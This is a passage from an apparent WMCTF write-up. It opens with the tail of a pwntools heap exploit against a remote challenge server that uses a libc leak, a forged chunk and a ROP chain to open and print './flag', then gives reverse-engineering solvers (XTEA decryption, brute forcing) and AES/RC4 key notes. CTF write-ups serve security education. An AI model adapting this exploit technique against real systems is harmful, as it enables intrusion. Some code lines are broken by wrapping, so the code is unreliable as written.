    s.sendafter("Content",buf)
# s = process("./pwn")
s = remote("47.104.169.32","11543")
add('A'*0x100)#0
add('D'*0x100)#1
free(0)
show(0)
s.recvline()
mal = u64(s.recv(6)+"\x00\x00")-384
libc = ELF("./libc.so",checksec=False)
libc.address = mal-libc.sym['mal']
success(hex(libc.address))
fake_chunk = p64(mal+400-0x18)
fake_chunk += p64(libc.sym['__stdin_FILE']+0x40)
edit(0,fake_chunk)
add('B'*0x100)#2
# gdb.attach(s,"b *$rebase(0xca5)\nc")
ret = libc.address+0x0000000000000cdc
pop_rdi = libc.address+0x0000000000014862
mov_rdx = libc.address+0x000000000004951a
pop_rsi = libc.address+0x000000000001c237
pop_rdx = libc.address+0x000000000001bea2
payload = 
'A'*0x30+p64(libc.sym['__stdout_FILE']+0x50)+p64(ret)+p64(0)+p64(mov_rdx)
payload += 
p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(libc.sym['__stdout_FILE'])+p64(pop_rdx)+p64(0
x500)+p64(libc.sym['read'])
add('C'*0xb0+payload)#3
payload = 'A'*56
payload += 
p64(pop_rdi)+p64(libc.sym['__stdout_FILE']+0x100)+p64(pop_rsi)+p64(0)+p64(libc.sym
['open'])
payload += 
p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(libc.sym['__stdout_FILE']+0x200)+p64(pop_rdx)
+p64(0x100)+p64(libc.sym['read'])
payload += 
p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(libc.sym['__stdout_FILE']+0x200)+p64(pop_rdx)
+p64(0x100)+p64(libc.sym['write'])
payload = payload.ljust(0x100,'\x00')+"./flag\x00"
# raw_input(">")
s.send(payload)
s.interactive()
Reverse
Re1
VM逆向
from z3 import *
#WMCTF{}
#flag3 = 106 - 2
#flag4 = 55 - 3
#flag1 = 72
#flag2 = 98-1
xor_table = []
for i in xrange(0x100):
    v3 = i
    for j in xrange(8):
        if ( (v3 & 1) != 0 ):
            v3 = (v3 >> 1) ^ 0x8320EDB8
        else:
            v3 >>= 1
    xor_table.append(v3&0xFFFFFFFF)
# de1 = BitVec('de1',32)
# de2 = BitVec('de2',32)
# de3 = BitVec('de3',32)
# de4 = BitVec('de4',32)
# so = Solver()
# so.add(de2 + de1 == 0x11AB7A7A)
# so.add(de2 - de3 == 0x1CD4F222)
# so.add(de4 + de3 == 0xC940F021)
# so.add(de3 + de1 - de4 == 0x7C7D68D1)
# print(so.check())
# print(so.model())
def enc_xtea(c,k):
    v5 = c[0]
    v4 = c[1]
    v3 = 0
    for _ in xrange(32):
        v5 += (k[v3 & 3] + v3) ^ (v4 + ((v4 >> 5) ^ ((16 * v4) & 0xFFFFFFFF )))
        v5 &= 0xFFFFFFFF
        v3 += 0x9981ABCD
        v3 %= (0xFFFFFFFF+1)
        v4 += (k[(v3 >> 11) & 3] + v3) ^ (v5 + ((v5 >> 5) ^ (16 * v5)))
        v4 &= 0xFFFFFFFF
    # for _ in xrange(32):
    #     v4 -= (k[(v3 >> 11) & 3] + v3) ^ (v5 + ((v5 >> 5) ^ (16 * v5)))
    #     v4 %= (0xFFFFFFFF+1)
    #     v3 -= 0x9981ABCD
    #     v3 %= (0xFFFFFFFF+1)
    #     v5 -= (k[v3 & 3] + v3) ^ (v4 + ((v4 >> 5) ^ ((16 * v4) & 0xFFFFFFFF )))
    #     v5 %= (0xFFFFFFFF+1)
    res = [v5,v4]
    # *a3 = v5;
    # a3[1] = v4;
    return res
def dec_xtea(c,k):
    v5 = c[0]
    v4 = c[1]
    v3 = 0x9981ABCD * 32 
    v3 &= 0xFFFFFFFF
    # for _ in xrange(32):
    #     v5 += (k[v3 & 3] + v3) ^ (v4 + ((v4 >> 5) ^ ((16 * v4) & 0xFFFFFFFF )))
    #     v5 &= 0xFFFFFFFF
    #     v3 -= 0x9981ABCD
    #     v4 += (k[(v3 >> 11) & 3] + v3) ^ (v5 + ((v5 >> 5) ^ (16 * v5)))
    #     v4 &= 0xFFFFFFFF
    for _ in xrange(32):
        v4 -= (k[(v3 >> 11) & 3] + v3) ^ (v5 + ((v5 >> 5) ^ (16 * v5)))
        v4 %= (0xFFFFFFFF+1)
        v3 -= 0x9981ABCD
        v3 %= (0xFFFFFFFF+1)
        v5 -= (k[v3 & 3] + v3) ^ (v4 + ((v4 >> 5) ^ ((16 * v4) & 0xFFFFFFFF )))
        v5 %= (0xFFFFFFFF+1)
    res = [v5,v4]
    # *a3 = v5;
    # a3[1] = v4;
    return res
def lfsr(a1,a2,a3):
    v4 = a1
    for _ in xrange(a3):
        v4 = (v4 >> 8) ^ xor_table[(a2[_] ^ v4)&0xff]
        v4 &= 0xFFFFFFFF
    return a1 ^ v4
def gen_table(guess,length,addon = 0):
    res = []
    for i in xrange(length):
        t = guess + i + addon
        res.append(t & 0xff)
    return res
def brute(start,end,length):
    for i in xrange(0x20,0x80):
        # print('.')
        t = gen_table(i,length)
        for j in xrange(length):
            tmp_t = t[:]
            for change in xrange(0x100):
                tmp_t[j] = change
                if lfsr(start,tmp_t,length) == end:
                    print('start {} to end {}'.format(start,end),i,j,change)
import struct
def brute2():
    de3 = 1357369498
    de1 = 2750330814
    de4 = 2019106695
    de2 = 1841087164
    for i in xrange(0x10000):
        de3 &= 0xFFFF00FF
        de3 |= i & 0xFF00
        de4 = de4 & 0xFFFFFF00 | (i & 0xff)
        c1 = [0x556E2853,0x4393DF16]
        key1 = [de1,de3,de2,de4]
        res1 = dec_xtea(c1,key1)
        c2 = [0x1989FB2B,0x83F5A243]
        key2 = [de4,de2,de1,de3]
        res2 = dec_xtea(c2,key2)
        t = struct.pack("I",res1[0]) +struct.pack("I",res2[0]) + 
struct.pack("I",res2[1])+ struct.pack("I",res1[1])
        find_flag = 0
        for ts in t:
            if ord(ts)  0x80:
                find_flag = 1
                break
        if find_flag == 0:
            print(hex(i))
            print(t)
brute2()
# 0xb7ad
de3 = 1357369498
de1 = 2750330814
de4 = 2019106695
de2 = 1841087164
# t = gen_table(106,0xf)
# t[4] = 0xdc
# print (lfsr(de2,t,0xf) == de3)
# for i in xor_table:
#     print(hex(i))
# brute(de2,de3,15)
# print('.')
# brute(de3,de4,28)
# print('.')
# brute(0xFFFFFFFE,de1,0x100)
后面那个拼的@有一个负数溢出，可以改到一个奇怪的标志位用然后用#改size，最后用-改到那个dead
Re2
字符串解密在init_array
AES+RC4 , AES的shiftRow有修改 ,RC4多异或了0x50
AES_key:'54 72 61 63 65 72 50 69 64 3a 09 30 0a 66 6c 67'
AES_iv:'00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F'
RC4_key:Hello from C++
# print('.')
# brute(de1,de2,0x100)
# Hah4
de3 &= 0xFFFF00FF
de3 |= 0xdead & 0xFF00
de4 = de4 & 0xFFFFFF00 | 0xad
key1 = [de1,de3,de2,de4]
c1 = [0x556E2853,0x4393DF16]
res = dec_xtea(c1,key1)
for i in res:
    print(hex(i))
# c1 = [0x4d7bd39b,0xab6cbe58]
# res = dec_xtea(c1,key1)
# for i in res:
#     print(hex(i))
key2 = [de4,de2,de1,de3]
c2 = [0x1989FB2B,0x83F5A243]
res = dec_xtea(c2,key2)
for i in res:
    print(hex(i))
# c1 = [0x1989FB2B,0x1989FB2A]
# key2 = [de4,de2,de1,de3]
# enc1 = enc_xtea(c1,key2)
# res = dec_xtea(enc1,key2)
# for i in res:
#     print(hex(i))
#include 
#include 
#include "rijndael.h"
//
// Public Definitions
//
/* moved to rijndael.h */
//
// Internal Definitions
//
/*
 * Encryption Rounds
 */
int g_aes_key_bits[] = {
    /* AES_CYPHER_128 */ 128,
    /* AES_CYPHER_192 */ 192,
    /* AES_CYPHER_256 */ 256,
};
int g_aes_rounds[] = {
    /* AES_CYPHER_128 */  10,
    /* AES_CYPHER_192 */  12,
    /* AES_CYPHER_256 */  14,
};
int g_aes_nk[] = {
    /* AES_CYPHER_128 */  4,
    /* AES_CYPHER_192 */  6,
    /* AES_CYPHER_256 */  8,
};
int g_aes_nb[] = {
    /* AES_CYPHER_128 */  4,
    /* AES_CYPHER_192 */  4,
    /* AES_CYPHER_256 */  4,
};
/*
 * aes Rcon:
 *
 * WARNING: Rcon is designed starting from 1 to 15, not 0 to 14.